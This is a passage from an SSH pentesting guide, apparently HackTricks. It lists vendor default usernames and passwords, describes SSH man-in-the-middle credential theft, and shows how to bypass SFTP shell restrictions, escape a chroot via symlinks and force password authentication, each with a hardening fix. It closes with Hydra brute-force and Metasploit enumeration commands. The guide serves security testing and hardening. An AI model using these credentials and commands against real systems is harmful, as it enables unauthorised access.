pvadmin, passw0rd, besgroup, vcx, nice, access, config, 3V@rpar, 3V#rpar, procurve, badg3r5, OpC_op, !manage, !admin\nHuawei\nadmin, root\n123456, admin, root, Admin123, Admin@storage, Huawei12#$, HwDec@01, hwosta2.0, HuaWei123, fsp200@HW, huawei123\nIBM\nUSERID, admin, manager, mqm, db2inst1, db2fenc1, dausr1, db2admin, iadmin, system, device, ufmcli, customer\nPASSW0RD, passw0rd, admin, password, Passw8rd, iadmin, apc, 123456, cust0mer\nJuniper\nnetscreen\nnetscreen\nNetApp\nadmin\nnetapp123\nOracle\nroot, oracle, oravis, applvis, ilom-admin, ilom-operator, nm2user\nchangeme, ilom-admin, ilom-operator, welcome1, oracle\nVMware\nvi-admin, root, hqadmin, vmware, admin\nvmware, vmw@re, hqadmin, default\nSSH-MitM\nIf you are in the local network as the victim which is going to connect to the SSH server using username and password you could try to\nperform a MitM attack to steal those credentials:\nAttack path:\nuser traffic is redirected to the attacking machine\nthe attacker monitors attempts to connect to the SSH server and redirects them to its SSH server\nthe attacker's SSH server is configured, firstly, to log all entered data, including the user's password, and, secondly, send commands to the legitimate SSH server to which the user wants to connect, to execute them, and then return the results to the legitimate user\n****\nSSH MITM\n**** does exactly what is described above.\nIn order to capture perform the actual MitM you could use techniques like ARP spoofing, DNS spoofin or others described in the\nNetwork Spoofing attacks\n.\nConfig Misconfigurations\nRoot login\nBy default most SSH server implementation will allow root login, it is advised to disable it because if the credentials of this accounts leaks, attackers will get administrative privileges directly and this will also allow attackers to conduct bruteforce attacks on this account.\nHow to disable root login for openSSH:\n1.\nEdit SSH server configuration\nsudoedit /etc/ssh/sshd_config\n2.\nChange\n#PermitRootLogin yes\ninto\nPermitRootLogin no\n3.\nTake into account configuration changes:\nsudo systemctl daemon-reload\n4.\nRestart the SSH server\nsudo systemctl restart sshd\nSFTP command execution\nAnother common SSH misconfiguration is often seen in SFTP configuration. Most of the time when creating a SFTP server the administrator want users to have a SFTP access to share files but not to get a remote shell on the machine. So they think that creating a user, attributing him a placeholder shell (like\n/usr/bin/nologin\nor\n/usr/bin/false\n) and chrooting him in a jail is enough to avoid a shell access or abuse on the whole file system. But they are wrong,\na user can ask to execute a command right after authentication before it’s default command or shell is executed\n. So to bypass the placeholder shell that will deny shell access, one only has to ask to execute a command (eg.\n/bin/bash\n) before, just by doing:\n$ ssh -v\n[email protected]\nid\n...\nPassword:\ndebug1: Authentication succeeded (keyboard-interactive).\nAuthenticated to 192.168.1.94 ([192.168.1.94]:22).\ndebug1: channel 0: new [client-session]\ndebug1: Requesting\n[email protected]\ndebug1: Entering interactive session.\ndebug1: pledge: network\ndebug1: client_input_global_request: rtype\n[email protected]\nwant_reply 0\ndebug1: Sending command: id\ndebug1: client_input_channel_req: channel 0 rtype exit-status reply 0\ndebug1: client_input_channel_req: channel 0 rtype\n[email protected]\nreply 0\nuid=1000(noraj) gid=100(users) groups=100(users)\ndebug1: channel 0: free: client-session, nchannels 1\nTransferred: sent 2412, received 2480 bytes, in 0.1 seconds\nBytes per second: sent 43133.4, received 44349.5\ndebug1: Exit status 0\n​\n$ ssh\n[email protected]\n/bin/bash\nHere is an example of secure SFTP configuration (\n/etc/ssh/sshd_config\n– openSSH) for the user\nnoraj\n:\nMatch User noraj\nChrootDirectory %h\nForceCommand internal-sftp\nAllowTcpForwarding no\nPermitTunnel no\nX11Forwarding no\nPermitTTY no\nThis configuration will allow only SFTP: disabling shell access by forcing the start command and disabling TTY access but also disabling all kind of port forwarding or tunneling.\nSFTP Tunneling\nIf you have access to a SFTP server you can also tunnel your traffic through this for example using the common port forwarding:\nsudo ssh -L <local_port>:<remote_host>:<remote_port> -N -f <username>@<ip_compromised>\nSFTP Symlink\nThe\nsftp\nhave the command \"\nsymlink\n\". Therefor, if you have\nwritable rights\nin some folder, you can create\nsymlinks\nof\nother folders/files\n. As you are probably\ntrapped\ninside a chroot this\nwon't be specially useful\nfor you, but, if you can\naccess\nthe created\nsymlink\nfrom a\nno-chroot\nservice\n(for example, if you can access the symlink from the web), you could\nopen the symlinked files through the web\n.\nFor example, to create a\nsymlink\nfrom a new file\n\"\nfroot\n\" to \"\n/\n\"\n:\nsftp> symlink / froot\nIf you can access the file \"\nfroot\n\" via web, you will be able to list the root (\"/\") folder of the system.\nAuthentication methods\nOn high security environment it’s a common practice to enable only key-based or two factor authentication rather than the simple factor password based authentication. But often the stronger authentication methods are enabled without disabling the weaker ones. A frequent case is enabling\npublickey\non openSSH configuration and setting it as the default method but not disabling\npassword\n. So by using the verbose mode of the SSH client an attacker can see that a weaker method is enabled:\n$ ssh -v 192.168.1.94\nOpenSSH_8.1p1, OpenSSL 1.1.1d  10 Sep 2019\n...\ndebug1: Authentications that can continue: publickey,password,keyboard-interactive\nFor example if an authentication failure limit is set and you never get the chance to reach the password method, you can use the\nPreferredAuthentications\noption to force to use this method.\n$ ssh -v 192.168.1.94 -o PreferredAuthentications=password\n...\ndebug1: Next authentication method: password\nReview the SSH server configuration is necessary to check that only expected\nmethods are authorized. Using the verbose mode on the client can help to see\nthe effectiveness of the configuration.\nConfig files\nssh_config\nsshd_config\nauthorized_keys\nssh_known_hosts\nknown_hosts\nid_rsa\nFuzzing\n​\nhttps://packetstormsecurity.com/files/download/71252/sshfuzz.txt\n​\n​\nhttps://www.rapid7.com/db/modules/auxiliary/fuzzers/ssh/ssh_version_2\n​\nReferences\nYou can find interesting guides on how to harden SSH in\nhttps://www.ssh-audit.com/hardening_guides.html\n​\n​\nhttps://community.turgensec.com/ssh-hacking-guide\n​\n​\n​\nIf you are interested in\nhacking career\nand hack the unhackable -\nwe are hiring!\n(\nfluent polish written and spoken required\n).\nCareers | stmcyber.com | penetration testing\nstmcyber.com\nHackTricks Automatic Commands\nProtocol_Name: SSH\nPort_Number: 22\nProtocol_Description: Secure Shell Hardening\n​\nEntry_1:\nName: Hydra Brute Force\nDescription: Need Username\nCommand: hydra -v -V -u -l {Username} -P {Big_Passwordlist} -t 1 {IP} ssh\nEntry_2:\nName: consolesless mfs enumeration\nDescription: SSH enumeration without the need to run msfconsole\nNote: sourced from https://github.com/carlospolop/legion\nCommand: msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_version; set RHOSTS {IP}; set RPORT 22; run; exit' && msfconsole -q -x 'use scanner/ssh/ssh_enumusers; set RHOSTS {IP}; set RPORT 22; run; exit' && msfconsole -q -x 'use auxiliary/scanner/ssh/juniper_backdoor; set RHOSTS {IP}; set RPORT 22; run; exit'\n​\n☁️ HackTricks Cloud ☁️\n-\n🐦 Twitter 🐦\n-\n🎙️ Twitch 🎙️\n-\n🎥 Youtube 🎥\n​\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nGet the\nofficial PEASS & HackTricks swag\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n​\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nFTP Bounce - Download 2ºFTP file\nNext\n- Network Services Pentesting\n23 - Pentesting Telnet\nLast modified\n2mo ago"
    }
]